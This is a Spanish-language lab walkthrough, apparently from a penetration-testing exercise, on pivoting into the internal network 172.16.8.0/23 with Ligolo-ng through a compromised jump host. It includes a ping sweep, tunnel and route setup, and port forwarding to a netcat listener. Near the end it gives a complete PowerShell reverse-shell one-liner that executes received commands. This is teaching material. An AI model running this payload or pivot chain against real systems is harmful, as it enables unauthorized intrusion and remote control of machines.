---------------

## Representación del Escenario

 
![[Lab.png]]

> Nos encontramos en un laboratorio en el que nuestra maquina de ataque solo tiene conexión al host intermediario con dirección ip `10.129.229.147`, cuando entramos dentro de el vemos que tiene otra interfaz de red que nos brinda conexión a otra red distinta que es la `172.16.8.0/23`, el objetivo de esta explicación es que desde nuestra maquina de ataque tengamos acceso completo a la red no visible.

## Explicación

> Empezamos conectándonos al host intermediario con dirección ip `10.129.229.147`, a través de `ssh` y hacemos un barrido `ping` en la red nueva para el descubrimiento de hosts:

```bash
root@dmz01:~# for i in $(seq 254); do ping 172.16.8.$i -c1 -W1 & done | grep from

64 bytes from 172.16.8.3: icmp_seq=1 ttl=128 time=0.472 ms
64 bytes from 172.16.8.20: icmp_seq=1 ttl=128 time=0.433 ms
64 bytes from 172.16.8.120: icmp_seq=1 ttl=64 time=0.031 ms
64 bytes from 172.16.8.50: icmp_seq=1 ttl=128 time=0.642 ms
```

Como podemos observar descubrimos 4 hosts pero uno de ellos es nuestra interfaz de red(`172.16.8.120`).

> Una vez que sabemos que queremos `pivotar` a otra red de destino lo que tenemos que hacer es proceder con la descarga de `Ligolo-ng` de la siguiente forma:

[REPOSITORIO OFICIAL DE GITHUB](https://github.com/nicocha30/ligolo-ng)

- Nos descargamos el proxy:

```bash
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.2/ligolo-ng_proxy_0.8.2_linux_amd64.tar.gz
```

- Nos descargamos el agente:

```bash
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.2/ligolo-ng_agent_0.8.2_linux_amd64.tar.gz
```

- Descomprimimos dos veces el proxy:

```bash
7z x ligolo-ng_proxy_0.8.2_linux_amd64.tar.gz
7z x ligolo-ng_proxy_0.8.2_linux_amd64.tar
```

- Descomprimimos dos veces el agente:

```bash
7z x ligolo-ng_agent_0.8.2_linux_amd64.tar.gz
7z x ligolo-ng_agent_0.8.2_linux_amd64.tar
```

> Una vez todo descargado y descomprimido no tenemos que hacer nada mas, tendríamos los dos binarios que necesitamos para hacer todo, `agent` & `proxy`. Antes de ponerlos a funcionar habría que hacer unos preparativos previos en nuestra maquina atacante.

### Preparativos

> Crear una interfaz de red en modo túnel llamada `ligolo`:

```bash
sudo ip tuntap add user $USER mode tun ligolo
```

> Una vez creada la interfaz de red, hay que levantarla porque por defecto viene desactivada:

```bash
sudo ip link set ligolo up
```

> Añadir el segmento de red al que queremos llegar a ver(`172.16.8.0/23`), en nuestra tabla de enrutamiento de nuestra maquina atacante, y le vamos a decir que todo el flujo de ese segmento de red vaya a través de la nueva interfaz de red `ligolo`:

```bash
sudo ip route add 172.16.8.0/23 dev ligolo
```

### Puesta en marcha

> Arrancar el binario `proxy` en nuestra maquina atacante, que sirve de servidor:

```bash
chmod +x ./proxy
```

```bash
./proxy -selfcert

INFO[0000] Loading configuration file ligolo-ng.yaml    
WARN[0000] Using default selfcert domain 'ligolo', beware of CTI, SOC and IoC! 
INFO[0000] Listening on 0.0.0.0:11601
```

La `flag` `-selfcert` se la indicamos para evitar problemas con certificados.

> Ejecutar el `Agente` desde la maquina de salto de la siguiente forma:

- Transferimos el archivo:

```bash
scp -i dmz01_key agent root@10.129.229.147:/tmp
```

- Otorgamos permisos de ejecución al binario:

```bash
chmod +x ./agent
```

> Lo que queremos hacer ahora es conectarnos al servidor que hemos habilitado en nuestra maquina atacante que se a puesto en escucha por el puerto `11601` de la siguiente forma:

```bash
./agent -connect 10.10.14.237:11601 -ignore-cert
```

Indicamos de nuevo la `flag` `-ignore-cert` para evitar problemas con certificados...

> Nos vamos a la maquina atacante y nos llegara una notificación de que un agente se ha unido, lo único que tenemos que hacer es dar `Intro`, escribir dentro de la consola de `Ligolo` el comando `session` para elegir una sesión, solo nos aparecerá una por lo que hacemos `Intro` para seleccionar la numero 1. Escribimos el comando `start` y hacemos `Intro` y ya con esto tendríamos acceso al segmento de red que no teníamos acceso.

### Comprobación de acceso al nuevo segmento de red

> Tan simple como probar a hacer un `ping` de la siguiente forma:

```bash
ping -c 4 172.16.8.3
```

### Configuraciones varias para poder recibir Rev Shells

> Con la configuración que tenemos actualmente desde el punto de vista de nuestra maquina atacante tenemos acceso a la red interna `172.16.8.0/23` para enviar datos , pero en el punto de recibir, la red no sabe que ruta tiene que hacer para poder enviar datos a nuestra maquina atacante. En el caso de que obtengamos ejecución remota de comandos en la maquina `172.16.8.3`, vamos a querer entablarnos una `reverse shell` para poder operar de una forma mas cómoda y estable, por lo que vamos a tener que hacer un redireccionamiento de puertos para que la maquina en la que hemos obtenido el `RCE`, sepa que ruta tenga que hacer para poder llegar a tener conectividad con nuestra maquina atacante:

- Nos ponemos en escucha en nuestra maquina de ataque por el puerto que queramos recibir nuestra `rev shell`:

```bash
rlwrap nc -nlvp 443
```

- Agregamos un `listener` dentro de `Ligolo` en nuestra maquina de ataque de la siguiente forma:

```bash
listener_add --addr 0.0.0.0:8181 --to 127.0.0.1:443
```

Lo que le estamos diciendo aquí es que todo el trafico entrante por el puerto `8181` lo redirija a nuestro `localhost` por el puerto `443` que lo tenemos en escucha.

- Ver los `listeners` que tenemos activos:

```bash
listener_list
```

> Ejecutamos la carga útil para recibir la `rev shell` en nuestra maquina atacante de la siguiente forma:

```powershell
$LHOST = "172.16.8.120"; $LPORT = 8181; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write("$Output`n"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()
```

**Aspecto importante a tener en cuenta:** Aquí estamos especificando la `dirección ip` de la otra interfaz de red de la maquina de salto, que tiene conectividad con el segmento de red al que estamos pivotando que no vemos desde nuestra maquina de ataque, y el segmento de código que estamos ejecutando lo estamos haciendo en la maquina `172.16.8.3` que hemos obtenido `RCE`.

> Con esto ya recibiríamos nuestro `rev shell` en nuestra maquina atacante y podríamos operar de una forma mas cómoda.

## Limpieza de la configuración una vez finalizada la auditoria

> Por una parte limpiamos la tabla de enrutamiento en nuestra maquina atacante de la siguiente forma:

```bash
sudo ip route del 172.16.8.0/23 dev ligolo
```

```bash
ip route list
```

> Eliminación de la interfaz de red `Ligolo`:

```bash
sudo ip link del ligolo
```